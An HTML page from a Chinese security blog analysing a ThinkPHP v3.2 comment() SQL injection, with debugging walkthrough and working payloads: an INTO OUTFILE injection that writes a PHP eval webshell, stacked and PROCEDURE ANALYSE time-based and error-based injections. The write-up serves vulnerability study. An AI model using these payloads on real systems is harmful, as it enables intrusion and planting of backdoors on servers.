@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.2.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.19.2","exturl":false,"sidebar":{"position":"right","width":200,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+
+
+<link rel="canonical" href="http://example.com/2023/12/25/ThinkPHP%20v3.2%20comment%20%E6%B3%A8%E9%87%8A%E6%B3%A8%E5%85%A5%20%E5%86%99shell/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2023/12/25/ThinkPHP%20v3.2%20comment%20%E6%B3%A8%E9%87%8A%E6%B3%A8%E5%85%A5%20%E5%86%99shell/","path":"2023/12/25/ThinkPHP v3.2 comment 注释注入 写shell/","title":"ThinkPHP v3.2 comment 注释注入写shell"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>ThinkPHP v3.2 comment 注释注入写shell | Y0ng's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Y0ng's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E8%AF%A6%E6%83%85"><span class="nav-text">漏洞详情</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A0%86%E5%8F%A0%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="nav-text">堆叠时间盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LIMIT%E5%90%8E-%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95"><span class="nav-text">LIMIT后 注入方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PROCEDURE"><span class="nav-text">PROCEDURE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#INTO"><span class="nav-text">INTO</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Y0ng</p>
+  <div class="site-description" itemprop="description">花有重开日，人无再少年</div>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/12/25/ThinkPHP%20v3.2%20comment%20%E6%B3%A8%E9%87%8A%E6%B3%A8%E5%85%A5%20%E5%86%99shell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Y0ng">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Y0ng's Blog">
+      <meta itemprop="description" content="花有重开日，人无再少年">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="ThinkPHP v3.2 comment 注释注入写shell | Y0ng's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ThinkPHP v3.2 comment 注释注入写shell
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-12-25 00:41:11" itemprop="dateCreated datePublished" datetime="2023-12-25T00:41:11+08:00">2023-12-25</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ThinkPHP%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/" itemprop="url" rel="index"><span itemprop="name">ThinkPHP漏洞集合</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h1><p>comment函数是用来进行查询注释功能，当执行sql语句时，搭配comment可能存在利用注释进行 <code>写shell</code>或者 <code>时间盲注</code></p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>控制器写入demo</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$user &#x3D; M(&#39;Users&#39;)-&gt;comment($id)-&gt;find(intval($id));</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1*&#x2F; into outfile &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;3.php&quot; LINES STARTING BY &#39;&lt;?php eval($_POST[0]);?&gt;&#39;&#x2F;*</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/80b3ae7446c643fca59b073466c53b0c.png"></p>
+<a id="more"></a>
+
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>首先看一下函数调用栈</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/e1ebf8f94d424ab4b41cd7d01202e7db.png"></p>
+<p>开始跟进调试</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/695622b2fbba4508b5cbfe6ec1121686.png"></p>
+<p>跟进comment函数</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/fbb9cf64899b44f093df8805aa1ca851.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_19,color_FFFFFF,t_70,g_se,x_16"></p>
+<p>给<code>$options加上comment</code>就是我们传入的东西</p>
+<p>中间过程同thinkphp 3.2.3find 注入过程分析相同，往下走到这里select方法</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/6a900e3398c04e7dacd5f8eaea1e0167.png"></p>
+<p>跟进，对$options中的model和bind进行操作，不影响</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/b4f0a52457494c11893be3596cd578ae.png"></p>
+<p>跟进<code>buildSelectSql()</code>开始构建sql语句</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/20dea038e2c34d8c90e32226f697cf74.png"></p>
+<p>跟进 <code>parseSql()</code>，分析 $options中的comment</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/abbfc9af56d84d579187cc7c6447bdd4.png"></p>
+<p>跟进</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/f7b9b139ca03456aad4dc572f3573578.png"></p>
+<p>我们传入的comment被加入到注释中，可以通过闭合前后注释进行注入</p>
+<p>先尝试一下</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/5054a83556bc4570b3ce6aa714c236f7.png"></p>
+<p>构造的sql语句注入点在LIMIT 1 后面的地方，也就是说</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT [注入点]</span><br></pre></td></tr></table></figure>
+<p>那么怎么利用这一点？</p>
+<h2 id="堆叠时间盲注"><a href="#堆叠时间盲注" class="headerlink" title="堆叠时间盲注"></a>堆叠时间盲注</h2><p>本地测试可以尝试<code>堆叠注入方式来进行时间盲注</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1*&#x2F;;select if(substr(database(),1,1)&#x3D;&#39;s&#39;,sleep(3),0)&#x2F;*</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/161b37ef94ea418b8605aff85fd0a56d.png"></p>
+<p>ctfshow 题目环境下</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/1201c45b1bf8428c817939d04430dc03.png"></p>
+<h2 id="LIMIT后-注入方法"><a href="#LIMIT后-注入方法" class="headerlink" title="LIMIT后 注入方法"></a>LIMIT后 注入方法</h2><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html">Mysql下Limit注入方法 | 离别歌 (leavesongs.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/natian-ws/p/7203277.html">Mysql注入点在limit关键字后面的利用方法 - 那天ws </a></p>
+<p>此方法适用于<code>MySQL 5.x中</code>，在 <code>limit语句后面的注入</code></p>
+<p>首先查看 <code>select</code> 用法</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT</span><br><span class="line">    [ALL | DISTINCT | DISTINCTROW ]</span><br><span class="line">      [HIGH_PRIORITY]</span><br><span class="line">      [STRAIGHT_JOIN]</span><br><span class="line">      [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT]</span><br><span class="line">      [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS]</span><br><span class="line">    select_expr [, select_expr ...]</span><br><span class="line">    [FROM table_references</span><br><span class="line">    [WHERE where_condition]</span><br><span class="line">    [GROUP BY &#123;col_name | expr | position&#125;</span><br><span class="line">      [ASC | DESC], ... [WITH ROLLUP]]</span><br><span class="line">    [HAVING where_condition]</span><br><span class="line">    [ORDER BY &#123;col_name | expr | position&#125;</span><br><span class="line">      [ASC | DESC], ...]</span><br><span class="line">    [LIMIT &#123;[offset,] row_count | row_count OFFSET offset&#125;]   &#x2F;&#x2F;这里</span><br><span class="line">    [PROCEDURE procedure_name(argument_list)]</span><br><span class="line">    [INTO OUTFILE &#39;file_name&#39; export_options</span><br><span class="line">      | INTO DUMPFILE &#39;file_name&#39;</span><br><span class="line">      | INTO var_name [, var_name]]</span><br><span class="line">    [FOR UPDATE | LOCK IN SHARE MODE]]</span><br></pre></td></tr></table></figure>
+
+<p>根据文章 有 <code>两种方式</code><br> <code>limit</code> 关键字后面还有 <code>PROCEDURE</code> 和 <code>INTO</code> 关键字，<code>INTO 关键字在有写权限可以用来写文件</code>，这里看一下 <code>PROCEDURE</code> 关键字.MySQL默认可用的存储过程只有 ANALYSE (doc)</p>
+<h3 id="PROCEDURE"><a href="#PROCEDURE" class="headerlink" title="PROCEDURE"></a>PROCEDURE</h3><p>报错注入</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</span><br><span class="line"> </span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;:5.5.41-0ubuntu0.14.04.1&#39;</span><br></pre></td></tr></table></figure>
+
+<p>时间盲注</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select </span><br><span class="line">extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</span><br></pre></td></tr></table></figure>
+
+<h3 id="INTO"><a href="#INTO" class="headerlink" title="INTO"></a>INTO</h3><p>尝试利用 <code>into outfile</code> 写shell 虽然<code>dumpfile</code>也可以写文件但是因为 <code>dumpfile</code> 后面没有附加参数<code>(export_options)</code> 这点是 <code>into outfile</code> 利用的关键</p>
+<p>看一下后面的参数</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT ... INTO OUTFILE &#39;file_name&#39;</span><br><span class="line">        [CHARACTER SET charset_name]</span><br><span class="line">        [export_options]</span><br><span class="line"></span><br><span class="line">export_options:</span><br><span class="line">    [&#123;FIELDS | COLUMNS&#125;</span><br><span class="line">        [TERMINATED BY &#39;string&#39;]&#x2F;&#x2F;分隔符</span><br><span class="line">        [[OPTIONALLY] ENCLOSED BY &#39;char&#39;]</span><br><span class="line">        [ESCAPED BY &#39;char&#39;]</span><br><span class="line">    ]</span><br><span class="line">    [LINES</span><br><span class="line">        [STARTING BY &#39;string&#39;]</span><br><span class="line">        [TERMINATED BY &#39;string&#39;]</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure>
+<p><code>OPTION</code> 参数为可选参数选项，其可能的取值有：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#96;FIELDS TERMINATED BY &#39;字符串&#39;&#96;：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\t”。</span><br><span class="line"></span><br><span class="line">&#96;FIELDS ENCLOSED BY &#39;字符&#39;&#96;：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。</span><br><span class="line"></span><br><span class="line">&#96;FIELDS OPTIONALLY ENCLOSED BY &#39;字符&#39;&#96;：设置字符来括住CHAR、VARCHAR和TEXT等字符型字段。默认情况下不使用任何符号。</span><br><span class="line"></span><br><span class="line">&#96;FIELDS ESCAPED BY &#39;字符&#39;&#96;：设置转义字符，只能为单个字符。默认值为“\”。</span><br><span class="line"></span><br><span class="line">&#96;LINES STARTING BY &#39;字符串&#39;&#96;：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。</span><br><span class="line"></span><br><span class="line">&#96;LINES TERMINATED BY &#39;字符串&#39;&#96;：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\n”。</span><br></pre></td></tr></table></figure>
+
+<p>给出payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;?id&#x3D;1*&#x2F; into outfile &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;3.php&quot; LINES STARTING BY &#39;&lt;?php eval($_POST[0]);?&gt;&#39;&#x2F;*</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/71f97b7605f14a3daf079aeb2f88436a.png"></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/12/25/ThinkPHP%20v3.2.3%20find%E5%87%BD%E6%95%B0%E5%BC%95%E8%B5%B7%E7%9A%84sql%E6%B3%A8%E5%85%A5/" rel="prev" title="ThinkPHP 3.2.3 find/select/delete注入">
+                  <i class="fa fa-angle-left"></i> ThinkPHP 3.2.3 find/select/delete注入
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/12/25/ThinkPHP%20v6.0.9%20save()%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6/" rel="next" title="ThinkPHP v6.0.9 反序列化&任意写文件 分析">
+                  ThinkPHP v6.0.9 反序列化&任意写文件 分析 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Y0ng</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
